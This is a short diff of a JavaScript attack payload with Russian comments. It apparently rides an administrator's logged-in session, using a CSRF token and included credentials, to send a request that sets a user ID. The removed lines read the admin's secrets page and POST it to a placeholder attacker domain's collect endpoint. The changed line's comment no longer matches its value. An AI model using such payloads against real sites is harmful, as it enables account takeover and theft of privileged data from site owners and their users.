@@ -17,19 +17,7 @@
                 'CSRF-Token': csrf
             },
             credentials: 'include',
-            body: JSON.stringify({ userId: 2 }) // 2 – ваш ID в базе
-        });
-
-        // читаем страницу с секретами администратора
-        const secret = await fetch('http://localhost:3000/secrets', {
-            credentials: 'include'
-        }).then(r => r.text());
-
-        // отправляем результат обратно на наш сервер
-        await fetch('https://ваш-домен.example/collect', {
-            method: 'POST',
-            headers: {'Content-Type': 'text/plain'},
-            body: secret
+            body: JSON.stringify({ userId: 170 }) // 2 – ваш ID в базе
         });
     } catch(e) {
         // в случае ошибки – просто отправляем текст ошибки
